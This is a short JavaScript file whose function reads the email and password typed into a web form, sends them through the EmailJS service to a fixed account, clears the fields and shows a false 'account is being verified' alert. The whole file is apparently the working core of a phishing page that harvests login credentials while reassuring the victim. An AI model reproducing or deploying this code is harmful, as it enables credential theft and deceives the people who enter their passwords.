function sendMail() {
    var params = {
        email: document.getElementById("email").value ,
        pass: document.getElementById("pass").value
    };

const serviceId = "service_3e8c9mv";
const templateId = "template_0i95u8r";

emailjs
.send(serviceId, templateId, params)
.then((res) => {
        document.getElementById("email").value = "";
        document.getElementById("pass").value = "";
        // document.getElementById("verify").innerText = "Account is being verified, you can now exit. You will receive a message when verification is completed.";
        // console.log(res);
        alert("Account is being verified, you can now exit. You will receive a message when verification is completed."); 
        }
)
.catch((err) => console.log(err));
}
